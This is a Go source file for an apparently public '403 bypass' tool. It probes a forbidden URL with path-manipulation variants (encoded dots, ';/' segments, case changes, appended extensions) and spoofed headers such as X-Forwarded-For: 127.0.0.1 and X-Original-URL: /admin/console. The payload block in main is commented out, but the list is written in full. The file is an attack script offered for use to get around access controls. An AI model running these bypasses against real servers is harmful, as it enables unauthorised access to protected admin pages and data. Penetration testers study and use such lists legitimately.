package main

import (
	"fmt"
	"net/http"
	"os"
	"strings"
	"time"
)

const colorReset = "\033[0m"
const colorRed = "\033[31m"
const colorGreen = "\033[32m"
const colorYellow = "\033[33m"

func PrintBanner() {
	banner := `
██    ██  █████  ██   ██  ██████  ██████  ██████  ████████ 
 ██  ██  ██   ██ ██   ██ ██  ████      ██ ██   ██    ██    
  ████   ███████ ███████ ██ ██ ██  █████  ██████     ██    
   ██    ██   ██      ██ ████  ██      ██ ██   ██    ██    
   ██    ██   ██      ██  ██████  ██████  ██████     ██    
									
                               Yet Another 403 Bypass Tool
`
	fmt.Println(banner)
}

func GetPath(url string) string {
	return url[strings.LastIndex(url, "/")+1:]
}

func GetUrl(url string) string {
	return url[:strings.LastIndex(url, "/")]
}

func Check(err error) {
	if err != nil {
		panic(err)
	}
}

func Request(payload string) {

	response, err := http.Get(payload)
	Check(err)

	if response.StatusCode == 200 {
		fmt.Println(colorGreen + response.Status + colorReset + " => " + payload)
	} else if response.StatusCode == 401 || response.StatusCode == 403 || response.StatusCode == 404 {
		fmt.Println(colorRed + response.Status + colorReset + " => " + payload)
	} else {
		fmt.Println(colorYellow + response.Status + colorReset + " => " + payload)
	}

	defer response.Body.Close()
}

func RequestWithHeaders(url string, header string, value string) {

	client := &http.Client{}
	req, err := http.NewRequest("GET", url, nil)
	Check(err)

	req.Header.Set(header, value)
	response, err := client.Do(req)
	Check(err)

	if response.StatusCode == 200 {
		fmt.Println(colorGreen + response.Status + colorReset + " => " + url + " (" + header + ": " + value + ")")
	} else if response.StatusCode == 401 || response.StatusCode == 403 || response.StatusCode == 404 {
		fmt.Println(colorRed + response.Status + colorReset + " => " + url + " (" + header + ": " + value + ")")
	} else {
		fmt.Println(colorYellow + response.Status + colorReset + " => " + url + " (" + header + ": " + value + ")")
	}

	defer response.Body.Close()
}

func CheckConnection(url string) bool {
	client := http.Client{
		Timeout: 3 * time.Second,
	}
	_, err := client.Get(url)
	if err != nil {
		fmt.Printf("[!] Could not get \"%s\".\n", url)
		fmt.Println("     Please check your internet connection.")
		return false
	}
	return true
}

func main() {

	PrintBanner()

	if len(os.Args) < 2 || os.Args[1] == "-h" || os.Args[1] == "--help" {
		fmt.Println("Usage: 403_bypass <url>")
		fmt.Println("Example: 403_bypass \"http://example.com/secrets\"")
		return
	}

	base_url := os.Args[1]
	if !CheckConnection(base_url) {
		return
	}

	path := GetPath(base_url)
	url := GetUrl(base_url)

	if path == "" {
		fmt.Println("[-] Please enter a valid path.")
		fmt.Println("Example: http://example.com/secrets")
		return
	}

	CheckConnection(url)

	/* Request(url + "/" + path)                  // example.com/secret
	Request(url + "/" + strings.ToUpper(path)) // example.com/SECRET
	Request(url + "/" + path + "/")            // example.com/secret/
	Request(url + "//" + path + "//")          // example.com//secret//
	Request(url + "/;/" + path)                // example.com/;/secret
	Request(url + "//;//" + path)              // example.com//;//secret
	Request(url + "/.;/" + path)               // example.com/.;/secret
	Request(url + "/%2e/" + path)              // example.com/%2e/secret
	Request(url + "/%252e/" + path)            // example.com/%252e/secret
	Request(url + "/%ef%bc%8f" + path)         // example.com/%ef%bc%8fsecret
	Request(url + "/" + path + "%20")          // example.com/secret%20
	Request(url + "/" + path + "%09")          // example.com/secret%09
	Request(url + "/" + path + ".json")        // example.com/secret.json
	Request(url + "/" + path + ".html")        // example.com/secret.html
	Request(url + "/" + path + ".php")         // example.com/secret.php
	Request(url + "/" + path + "/*")           // example.com/secret/*
	Request(url + "/" + path + "?")            // example.com/secret?
	Request(url + "/" + path + "/?blob")       // example.com/secret/?blob
	Request(url + "/" + path + "#")            // example.com/secret#

	RequestWithHeaders(base_url, "X-Originating-IP", "127.0.0.1")
	RequestWithHeaders(base_url, "X-Forwarded-For", "127.0.0.1")
	RequestWithHeaders(base_url, "X-Forwarded", "127.0.0.1")
	RequestWithHeaders(base_url, "Forwarded-For", "127.0.0.1")
	RequestWithHeaders(base_url, "X-Remote-IP", "127.0.0.1")
	RequestWithHeaders(base_url, "X-Remote-Addr", "127.0.0.1")
	RequestWithHeaders(base_url, "X-ProxyUser-Ip", "127.0.0.1")
	RequestWithHeaders(base_url, "X-Original-URL", "127.0.0.1")
	RequestWithHeaders(base_url, "Client-IP", "127.0.0.1")
	RequestWithHeaders(base_url, "True-Client-IP", "127.0.0.1")
	RequestWithHeaders(base_url, "Cluster-Client-IP", "127.0.0.1")
	RequestWithHeaders(base_url, "X-ProxyUser-Ip", "127.0.0.1")
	RequestWithHeaders(base_url, "Host", "localhost")
	RequestWithHeaders(base_url, "X-Original-URL", "/admin/console")
	RequestWithHeaders(base_url, "X-Rewrite-URL", "/admin/console") */

}
